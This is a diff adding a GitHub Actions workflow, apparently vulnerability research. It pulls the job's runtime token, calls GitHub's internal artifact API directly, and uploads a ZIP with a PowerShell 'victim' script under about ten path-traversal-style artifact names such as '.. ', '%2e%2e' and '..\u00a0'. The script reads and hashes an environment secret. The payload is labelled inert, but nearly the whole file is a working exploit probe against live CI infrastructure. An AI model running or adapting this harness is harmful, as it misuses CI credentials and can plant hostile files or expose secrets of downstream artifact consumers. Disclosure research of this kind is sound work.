@@ -1,0 +1,200 @@
+name: Research artifact-name normalization producer
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+    paths:
+      - research-artifact-name-trigger.txt
+
+permissions:
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Build inert payload and positive-control ZIPs
+        shell: bash
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import zipfile
+
+          payload = r'''$ErrorActionPreference = 'Stop'
+          $marker = 'RESEARCH-ARTIFACT-NAME-NORMALIZATION-20260727'
+          $secret = [Environment]::GetEnvironmentVariable('RESEARCH_DUMMY_SECRET')
+          $sha = [System.BitConverter]::ToString(
+            [System.Security.Cryptography.SHA256]::Create().ComputeHash(
+              [System.Text.Encoding]::UTF8.GetBytes($secret)
+            )
+          ).Replace('-', '').ToLowerInvariant()
+          @(
+            "marker=$marker"
+            "dummy_secret_sha256=$sha"
+            'source=untrusted-artifact-name'
+          ) | Set-Content -Path (Join-Path $env:RUNNER_TEMP 'research-artifact-name-proof.txt') -Encoding utf8
+          '''
+
+          with zipfile.ZipFile('payload.zip', 'w', zipfile.ZIP_DEFLATED) as z:
+              z.writestr('victim/trusted-consumer.ps1', payload)
+              z.writestr('payload-context.txt', 'controlled_payload=true\n')
+
+          with zipfile.ZipFile('safe.zip', 'w', zipfile.ZIP_DEFLATED) as z:
+              z.writestr('safe/control.txt', 'controlled_safe_artifact=true\n')
+          PY
+          sha256sum payload.zip safe.zip
+
+      - name: Publish artifact-name normalization matrix through Results protocol
+        id: publish
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const fs = require('fs')
+            const crypto = require('crypto')
+
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || ''
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL || ''
+            if (!token || !resultsUrl) throw new Error('Actions Results runtime context unavailable')
+
+            const parts = token.split('.')
+            const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'))
+            const match = /(?:^| )Actions\.Results:([^: ]+):([^ ]+)/.exec(claims.scp || '')
+            if (!match) throw new Error('Actions.Results scope unavailable')
+            const run = match[1]
+            const job = match[2]
+
+            const base = resultsUrl.endsWith('/') ? resultsUrl : `${resultsUrl}/`
+            const service = `${base}twirp/github.actions.results.api.v1.ArtifactService`
+            const payloadZip = fs.readFileSync('payload.zip')
+            const safeZip = fs.readFileSync('safe.zip')
+
+            const candidates = [
+              {label: 'dotdot-space', name: '.. '},
+              {label: 'dotdot-two-spaces', name: '..  '},
+              {label: 'dotdot-space-dot', name: '.. .'},
+              {label: 'three-dots', name: '...'},
+              {label: 'three-dots-space', name: '... '},
+              {label: 'dot-space-dot', name: '. .'},
+              {label: 'percent-dotdot', name: '%2e%2e'},
+              {label: 'dotdot-percent20', name: '..%20'},
+              {label: 'dotdot-nbsp', name: '..\u00a0'},
+              {label: 'dotdot-ideographic-space', name: '..\u3000'}
+            ]
+
+            async function post(method, body) {
+              const response = await fetch(`${service}/${method}`, {
+                method: 'POST',
+                headers: {
+                  authorization: `Bearer ${token}`,
+                  'content-type': 'application/json'
+                },
+                body: JSON.stringify(body),
+                signal: AbortSignal.timeout(20000)
+              })
+              const text = await response.text()
+              let json = null
+              try { json = text ? JSON.parse(text) : {} } catch (_) {}
+              return {status: response.status, json, text: text.slice(0, 200)}
+            }
+
+            async function publish(name, bytes, label) {
+              const digest = crypto.createHash('sha256').update(bytes).digest('hex')
+              const created = await post('CreateArtifact', {
+                workflow_run_backend_id: run,
+                workflow_job_run_backend_id: job,
+                name,
+                version: 7,
+                mime_type: 'application/zip'
+              })
+              const uploadUrl = created.json?.signed_upload_url || created.json?.signedUploadUrl || ''
+              if (uploadUrl) core.setSecret(uploadUrl)
+              let uploadHttp = 0
+              if (uploadUrl) {
+                const upload = await fetch(uploadUrl, {
+                  method: 'PUT',
+                  headers: {
+                    'x-ms-blob-type': 'BlockBlob',
+                    'x-ms-version': '2021-12-02',
+                    'content-type': 'application/zip'
+                  },
+                  body: bytes,
+                  signal: AbortSignal.timeout(20000)
+                })
+                uploadHttp = upload.status
+              }
+
+              let finalized = {status: 0, json: null, text: ''}
+              if (uploadHttp >= 200 && uploadHttp < 300) {
+                finalized = await post('FinalizeArtifact', {
+                  workflow_run_backend_id: run,
+                  workflow_job_run_backend_id: job,
+                  name,
+                  size: String(bytes.length),
+                  hash: `sha256:${digest}`
+                })
+              }
+
+              return {
+                label,
+                name_json: JSON.stringify(name),
+                create_http: created.status,
+                create_ok: created.json?.ok === true,
+                signed_upload_url: Boolean(uploadUrl),
+                upload_http: uploadHttp,
+                finalize_http: finalized.status,
+                finalize_ok: finalized.json?.ok === true,
+                artifact_id: finalized.json?.artifact_id || finalized.json?.artifactId || null,
+                create_error: created.json?.msg || created.json?.message || created.text || ''
+              }
+            }
+
+            const records = []
+            const safeName = `research-safe-${context.runId}`
+            records.push(await publish(safeName, safeZip, 'safe-control'))
+            for (const candidate of candidates) {
+              try {
+                records.push(await publish(candidate.name, payloadZip, candidate.label))
+              } catch (error) {
+                records.push({
+                  label: candidate.label,
+                  name_json: JSON.stringify(candidate.name),
+                  exception: String(error?.message || error).slice(0, 160)
+                })
+              }
+            }
+
+            const accepted = records.filter(r => r.finalize_ok === true)
+            const result = {
+              producer_run_id: context.runId,
+              workflow_run_backend_id_sha256: crypto.createHash('sha256').update(run).digest('hex'),
+              workflow_job_run_backend_id_sha256: crypto.createHash('sha256').update(job).digest('hex'),
+              safe_name: safeName,
+              safe_valid: records[0]?.finalize_ok === true,
+              accepted_count: accepted.length,
+              accepted_labels: accepted.map(r => r.label),
+              records
+            }
+            fs.writeFileSync('artifact-name-matrix.json', JSON.stringify(result, null, 2) + '\n')
+            core.setOutput('safe_valid', String(result.safe_valid))
+            core.setOutput('accepted_count', String(result.accepted_count))
+
+      - name: Upload sanitized matrix result
+        if: always()
+        uses: actions/upload-artifact@v7
+        with:
+          name: research-artifact-name-matrix-${{ github.run_id }}
+          path: artifact-name-matrix.json
+          retention-days: 1
+          if-no-files-found: warn
+
+      - name: Validate positive control
+        if: always()
+        shell: bash
+        env:
+          SAFE_VALID: ${{ steps.publish.outputs.safe_valid }}
+        run: |
+          set -euo pipefail
+          test "$SAFE_VALID" = true
+          printf 'RESULT=ARTIFACT_NAME_MATRIX_PUBLISHED\n'
